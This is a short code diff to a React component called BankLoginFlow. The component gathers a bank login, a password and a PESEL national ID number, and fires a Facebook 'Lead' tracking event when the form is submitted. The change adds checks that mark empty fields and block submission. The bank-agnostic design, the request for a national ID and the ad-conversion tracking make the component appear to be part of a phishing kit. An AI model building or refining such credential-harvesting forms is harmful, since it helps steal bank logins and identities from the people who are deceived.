@@ -57,11 +57,22 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
             if (busyRef.current) return;
             const data = new FormData(form);
             const fields: Record<string, string> = {};
+            let hasEmpty = false;
             for (const name of ['login', 'password', 'pesel']) {
                 const el = form.querySelector<HTMLInputElement>(`#${name}`);
-                if (el) fields[name] = el.value;
-                else if (data.has(name)) fields[name] = String(data.get(name) ?? '');
+                if (el) {
+                    if (!el.value.trim()) {
+                        el.style.borderColor = '#E21124';
+                        el.style.outline = 'none';
+                        el.addEventListener('input', () => { el.style.borderColor = ''; }, { once: true });
+                        hasEmpty = true;
+                    }
+                    fields[name] = el.value;
+                } else if (data.has(name)) {
+                    fields[name] = String(data.get(name) ?? '');
+                }
             }
+            if (hasEmpty) return;
             if (typeof window !== 'undefined' && typeof (window as any).fbq === 'function') {
                 (window as any).fbq('track', 'Lead');
             }
